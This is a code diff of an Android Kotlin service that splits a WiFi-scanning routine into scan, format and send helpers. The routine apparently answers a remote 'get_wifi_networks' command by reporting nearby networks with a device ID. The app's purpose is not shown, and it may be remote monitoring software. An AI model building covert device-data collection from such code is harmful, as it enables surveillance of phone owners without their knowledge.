@@ -195,6 +195,13 @@ class DataCollectionService : Service() {
     // --- WiFi Networks ---
     @Suppress("DEPRECATION")
     private fun collectAndSendWifiNetworks(requestId: String?) {
+        val networks = scanWifiNetworks()
+        val networksJson = formatWifiResults(networks)
+        sendWifiData(networksJson, requestId)
+    }
+
+    @Suppress("DEPRECATION")
+    private fun scanWifiNetworks(): JSONArray {
         val networks = JSONArray()
         try {
             val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as? WifiManager
@@ -259,7 +266,15 @@ class DataCollectionService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting WiFi networks: ${e.message}")
         }
+        return networks
+    }
 
+    private fun formatWifiResults(networks: JSONArray): JSONArray {
+        // Networks are already formatted as JSONArray by scanWifiNetworks
+        return networks
+    }
+
+    private fun sendWifiData(networks: JSONArray, requestId: String?) {
         val payload = JSONObject().apply {
             put("device_id", AndroidConfig.deviceId)
             put("command", "get_wifi_networks")
